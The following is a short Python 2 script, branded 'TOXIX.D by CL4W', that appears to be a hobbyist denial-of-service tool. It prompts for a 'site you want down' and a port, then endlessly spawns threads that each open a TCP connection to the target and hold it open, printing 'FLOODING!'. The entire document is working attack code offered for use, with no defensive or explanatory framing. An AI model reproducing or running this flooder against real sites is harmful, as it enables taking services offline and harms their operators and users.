from os import *
import os
import sys
from socket import *
from string import *
from random import *
from time import *
from thread import *
 
print "\a"
os.system("figlet TOXIX.D")
print("by CL4W V0.1")
print "\a"
 
host = raw_input("[INPUT] Site you want down: ")
port = input("[INPUT] Port number: ")
print "\a"
 
 
def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99999)
        sock1.close
    except:
        print ""
 
n = 1000000000000
 
 
while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "[ERROR] Connection Lost. Restart DOS"
    print "[INFO] FLOODING!"
    sleep(0.1)
